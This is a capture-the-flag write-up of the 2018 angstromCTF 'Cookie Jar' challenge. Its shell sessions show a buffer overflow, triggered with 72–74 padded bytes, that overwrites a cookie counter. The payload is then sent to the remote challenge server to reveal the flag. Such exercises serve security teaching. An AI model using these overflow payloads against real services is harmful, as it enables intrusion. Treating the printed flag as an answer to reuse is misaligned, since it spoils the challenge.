Cookie Jar
binary, 60

Note: Binary has been updated Try to break this Cookie Jar that was compiled from this source Once you've pwned the binary, test it out by connecting to nc shell.angstromctf.com 1234 to get the flag.

user@77b727a78098 /data/2018_angstromctf/binary/cookie_jar $ python -c 'print "A"*72' | ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar:
Sorry, you only had 0 cookies, try again!
user@77b727a78098 /data/2018_angstromctf/binary/cookie_jar $ python -c 'print "A"*73' | ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar:
Sorry, you only had 65 cookies, try again!
user@77b727a78098 /data/2018_angstromctf/binary/cookie_jar $ python -c 'print "A"*74' | ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar:
Congrats, you have 16705 cookies!
Here's your flag: ----------REDACTED----------


team332540@shell:/problems$ python -c 'print "A"*74' | nc shell.angstromctf.com 1234
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar:
Congrats, you have 16705 cookies!
Here's your flag: actf{eat_cookies_get_buffer}


team332540@shell:/problems$ python -c 'print "A"*72 + "d"' | nc shell.angstromctf.com 1234
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar:
Congrats, you have 100 cookies!
Here's your flag: actf{eat_cookies_get_buffer}


team332540@shell:/problems$ python -c 'print "A"*72 + "\x67\x12"' | nc shell.angstromctf.com 1234
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar:
Congrats, you have 4711 cookies!
Here's your flag: actf{eat_cookies_get_buffer}
